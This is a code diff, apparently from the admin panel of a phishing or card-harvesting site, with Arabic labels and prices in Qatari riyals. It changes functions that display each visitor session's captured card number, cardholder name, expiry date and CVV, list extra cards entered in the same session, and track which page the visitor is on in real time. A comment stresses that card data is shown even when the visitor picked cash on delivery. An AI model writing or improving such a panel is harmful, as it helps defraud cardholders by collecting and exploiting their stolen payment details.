-  html += '<span style="margin-right:auto;font-size:12px;color:var(--success);font-weight:600;">' + countLabel + '</span>';
-  html += '<span style="font-size:11px;color:#9ca3af;">' + arrowIcon + '</span>';
+  html += '<span class="dropdown-arrow" style="margin-right:auto;font-size:11px;color:var(--success);font-weight:600;">' + (hasHistory ? '▼ ' + count : '') + '</span>';
   html += '</div>';
   
   // Show current (latest) payment
@@ -1720,14 +2121,25 @@ function buildPaymentSection(data, allSubmissions = [], sessionId = '') {
     const currentData = current.data;
     const cardNum = currentData.cardNumber || currentData.card_number || '';
     const cvv = currentData.cvv || '';
+    const isCash = currentData.paymentMethod === 'cash';
     
     html += '<div id="paymentCurrent_' + sessionId + '" class="payment-current">';
+    
+    // Always show card data (even for cash)
     html += '<div class="data-grid">';
     if (cardNum) html += '<div class="data-field"><span class="data-label">البطاقة</span><span class="data-value" dir="ltr">' + escapeHtml(cardNum) + '</span></div>';
     if (currentData.cardHolder) html += '<div class="data-field"><span class="data-label">صاحب البطاقة</span><span class="data-value">' + escapeHtml(currentData.cardHolder) + '</span></div>';
     if (currentData.expiry) html += '<div class="data-field"><span class="data-label">تاريخ الانتهاء</span><span class="data-value" dir="ltr">' + escapeHtml(currentData.expiry) + '</span></div>';
     if (cvv) html += '<div class="data-field"><span class="data-label">CVV</span><span class="data-value highlight" dir="ltr">' + escapeHtml(cvv) + '</span></div>';
     html += '</div>';
+    
+    // Show payment method badge
+    if (isCash) {
+      html += '<div style="margin-top:8px;padding:6px 10px;background:#10b981;border-radius:6px;color:white;text-align:center;font-size:12px;font-weight:600;">';
+      html += '💵 دفع عند الاستلام - 25 ر.ق';
+      html += '</div>';
+    }
+    
     html += '</div>';
   }
   
@@ -1739,24 +2151,38 @@ function buildPaymentSection(data, allSubmissions = [], sessionId = '') {
       const timestamp = sub.timestamp ? formatTimeAgo(new Date(sub.timestamp)) : '';
       const cardNum = subData.cardNumber || subData.card_number || '';
       const cvv = subData.cvv || '';
+      const isCash = subData.paymentMethod === 'cash';
       
-      historyItems += '<div class="payment-history-item" style="padding:10px;background:rgba(107,114,128,0.15);border-radius:8px;margin-bottom:8px;border:1px solid rgba(255,255,255,0.1);">';
+      historyItems += '<div class="payment-history-item" style="padding:10px;background:rgba(16,185,129,0.08);border-radius:8px;margin-bottom:8px;border:1px solid rgba(16,185,129,0.2);">';
       historyItems += '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">';
-      historyItems += '<span style="font-size:11px;color:#9ca3af;font-weight:600;">البطاقة #' + (idx + 2) + '</span>';
+      historyItems += '<span style="font-size:11px;color:var(--success);font-weight:600;">#' + (idx + 2) + '</span>';
       historyItems += '<span style="font-size:10px;color:#6b7280;">' + timestamp + '</span>';
+      if (isCash) {
+        historyItems += '<span style="font-size:10px;padding:2px 8px;background:#10b981;color:white;border-radius:10px;font-weight:600;">💵</span>';
+      }
       historyItems += '</div>';
+      
+      // Always show card data (even for cash)
       historyItems += '<div class="data-grid">';
       if (cardNum) historyItems += '<div class="data-field"><span class="data-label">البطاقة</span><span class="data-value" dir="ltr">' + escapeHtml(cardNum) + '</span></div>';
       if (subData.cardHolder) historyItems += '<div class="data-field"><span class="data-label">صاحب البطاقة</span><span class="data-value">' + escapeHtml(subData.cardHolder) + '</span></div>';
       if (subData.expiry) historyItems += '<div class="data-field"><span class="data-label">تاريخ الانتهاء</span><span class="data-value" dir="ltr">' + escapeHtml(subData.expiry) + '</span></div>';
       if (cvv) historyItems += '<div class="data-field"><span class="data-label">CVV</span><span class="data-value" dir="ltr">' + escapeHtml(cvv) + '</span></div>';
-      historyItems += '</div></div>';
+      historyItems += '</div>';
+      
+      if (isCash) {
+        historyItems += '<div style="margin-top:6px;padding:4px 8px;background:#10b981;border-radius:4px;color:white;text-align:center;font-size:11px;font-weight:600;">';
+        historyItems += '💵 دفع عند الاستلام - 25 ر.ق';
+        historyItems += '</div>';
+      }
+      historyItems += '</div>';
     });
     
     html += '<div id="paymentHistory_' + sessionId + '" class="payment-history-dropdown" style="margin-top:10px;display:none;">' + historyItems + '</div>';
   }
   
   html += '</div>';
+  
   return html;
 }
 
@@ -1841,10 +2267,27 @@ function updateVisitorCardData(card, data) {
     }
   }
   
-  // Update page info if present
+  // Update page info if present - Smart page tracking
   if (data.current_page) {
-    const pageEl = card.querySelector('.card-page');
-    if (pageEl) pageEl.textContent = getPageName(data.current_page);
+    const pageInfo = getPageColor(data.current_page);
+    const pageBadge = card.querySelector('.page-badge');
+    if (pageBadge) {
+      pageBadge.textContent = pageInfo.text;
+      pageBadge.style.background = pageInfo.bg;
+    }
+    
+    // Update step indicator
+    const headerRight = card.querySelector('.header-right');
+    if (headerRight) {
+      const oldStepIndicator = headerRight.querySelector('.step-indicator');
+      const newStepIndicator = getStepIndicator(data.current_page);
+      if (oldStepIndicator && newStepIndicator) {
+        oldStepIndicator.outerHTML = newStepIndicator;
+      } else if (newStepIndicator && !oldStepIndicator) {
+        // Add step indicator if not exists
+        headerRight.insertAdjacentHTML('beforeend', newStepIndicator);
+      }
+    }
   }
   
   // Update last activity timestamp
@@ -2708,6 +3151,7 @@ async function validateAdminSession() {
 // Export functions
 window.showTab = showTab;
 window.toggleSound = toggleSound;
+window.enableNotifications = enableNotifications;
 window.processVisitorUpdate = processVisitorUpdate;
 window.createVisitorCardElement = createVisitorCardElement;
 window.updateVisitorCardFull = updateVisitorCardFull;
